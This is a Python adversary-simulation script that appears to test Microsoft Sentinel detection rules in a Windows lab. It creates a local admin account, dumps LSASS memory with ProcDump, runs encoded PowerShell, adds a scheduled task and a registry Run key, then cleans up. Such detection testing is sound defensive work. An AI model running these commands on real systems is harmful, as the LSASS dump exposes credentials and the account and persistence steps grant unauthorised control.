import subprocess
import os
import time
import datetime
import base64

log = []

def run(cmd, shell=True):
    try:
        result = subprocess.run(cmd, shell=shell, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def log_result(rule, action, output):
    entry = f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {rule} | {action}\n{output}\n"
    log.append(entry)
    print(entry)

print("=== Adversary Simulation Starting ===\n")
time.sleep(2)

# Rule 1 & 2 — Brute force + logon
print("[*] Simulating brute force...")
for i in range(10):
    out = run(f'runas /user:fakeuser{i} cmd /c exit')
    time.sleep(1)
log_result("Rule 1+2", "10 failed logon attempts generated", "EventID 4625 x10")

time.sleep(5)

# Rule 3 — New local admin account
print("[*] Creating new local admin account...")
out1 = run("net user labattacker P@ssw0rd123! /add")
out2 = run("net localgroup administrators labattacker /add")
log_result("Rule 3", "New admin account created", out1 + out2)

time.sleep(5)

# Rule 4 — LSASS access via ProcDump
print("[*] Attempting LSASS access...")
if os.path.exists("C:\\Tools\\procdump.exe"):
    out = run("C:\\Tools\\procdump.exe -accepteula -ma lsass.exe C:\\Tools\\lsass.dmp")
    log_result("Rule 4", "LSASS dump attempted via ProcDump", out)
else:
    log_result("Rule 4", "SKIPPED - procdump.exe not found in C:\\Tools", "Download from Sysinternals and rerun")

time.sleep(5)

# Rule 5 — Encoded PowerShell
print("[*] Running encoded PowerShell...")
cmd = "Write-Host 'Adversary simulation encoded execution test'"
encoded = base64.b64encode(cmd.encode("utf-16-le")).decode()
out = run(f'powershell.exe -EncodedCommand {encoded}')
log_result("Rule 5", "Encoded PowerShell executed", out)

time.sleep(5)

# Rule 6 — Scheduled task
print("[*] Creating scheduled task...")
out = run('schtasks /create /tn "WindowsUpdater" /tr "cmd.exe /c whoami" /sc minute /mo 1 /f')
log_result("Rule 6", "Scheduled task created", out)

time.sleep(5)

# Rule 7 — Registry run key
print("[*] Adding registry run key...")
out = run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /d "cmd.exe" /f')
log_result("Rule 7", "Registry run key added", out)

time.sleep(5)

# Rule 8 — Suspicious outbound connection
print("[*] Making suspicious outbound connection...")
out = run('powershell -c "Test-NetConnection -ComputerName 8.8.8.8 -Port 4444"')
log_result("Rule 8", "Outbound connection attempted on port 4444", out)

time.sleep(5)

# Rule 9 — Process injection simulation
print("[*] Simulating process injection...")
out = run('powershell -c "Start-Process notepad.exe; Start-Sleep 2; Stop-Process -Name notepad -Force"')
log_result("Rule 9", "Process spawn simulation executed", out)

time.sleep(5)

# Rule 10 — Special privileges (just log in as admin, already triggers)
print("[*] Rule 10 triggers on login as privileged account - check Sentinel for EventID 4672")
log_result("Rule 10", "No simulation needed - fires on admin logon", "Check Sentinel for EventID 4672")

# Cleanup
print("\n[*] Cleaning up...")
run("net user labattacker /delete")
run('schtasks /delete /tn "WindowsUpdater" /f')
run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /f')
if os.path.exists("C:\\Tools\\lsass.dmp"):
    os.remove("C:\\Tools\\lsass.dmp")
print("[*] Cleanup done")

# Write log file
log_path = "C:\\Tools\\sim_results.txt"
with open(log_path, "w") as f:
    f.write("=== Adversary Simulation Results ===\n\n")
    f.writelines(log)

print(f"\n=== Simulation Complete ===")
print(f"Results saved to {log_path}")
print("Now check Sentinel -> Incidents for triggered alerts")
